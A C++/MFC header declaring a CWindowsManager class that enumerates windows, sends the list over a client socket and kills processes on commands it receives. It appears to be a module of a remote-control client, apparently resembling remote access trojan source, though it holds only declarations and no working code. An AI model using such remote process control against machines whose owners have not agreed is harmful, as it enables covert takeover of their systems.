// WindowsManager.h: interface for the CWindowsManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_WINDOWSMANAGER_H__524BA78D_3978_4CBD_A236_21C52C2E97F0__INCLUDED_)
#define AFX_WINDOWSMANAGER_H__524BA78D_3978_4CBD_A236_21C52C2E97F0__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "../Contain/Manager.h"
class CWindowsManager  : public CManager  
{
public:
	CWindowsManager(CClientSocket *pClient);
	virtual ~CWindowsManager();

	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void KillProcess(LPBYTE lpBuffer, UINT nSize);


	LPBYTE GetWindowsList();
	void SendWindowsList();
	static bool CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam);
};

#endif // !defined(AFX_WINDOWSMANAGER_H__524BA78D_3978_4CBD_A236_21C52C2E97F0__INCLUDED_)
